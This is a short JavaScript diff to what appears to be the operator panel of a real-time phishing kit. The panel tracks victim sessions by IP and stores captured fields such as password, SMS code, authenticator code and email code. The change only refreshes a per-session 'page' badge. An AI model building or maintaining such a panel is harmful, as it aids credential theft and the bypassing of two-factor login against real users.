@@ -558,6 +558,7 @@ const clientDataTypeMap = {
       sessionsData[sid] = sessionsData[sid] || { ip, identifier: '', password: '', status: 'online', sms: '', gauth: '', phoneNumber: '', emailCode: '', page: '' };
       sessionsData[sid].status = 'online';
       sessionsData[sid].ip = ip;
+      sessionsData[sid].page = '';
       const existing = document.getElementById(`session-${sid}`);
       if (!existing) {
         const sessionBox = createSessionBox(sid, ip);
@@ -567,6 +568,13 @@ const clientDataTypeMap = {
       } else {
         const dot = existing.querySelector('.status-indicator');
         if (dot) dot.className = 'status-indicator status-online';
+      }
+      // Refresh page badge in case client-data page event already arrived
+      const pageEl = document.getElementById(`page-${sid}`);
+      if (pageEl && sessionsData[sid] && sessionsData[sid].page) {
+        pageEl.textContent = `📄 ${sessionsData[sid].page}`;
+      } else if (pageEl) {
+        pageEl.textContent = '';
       }
       if (currentDetailSession === sid) buildDetailPanel(sid);
       saveSessionData();
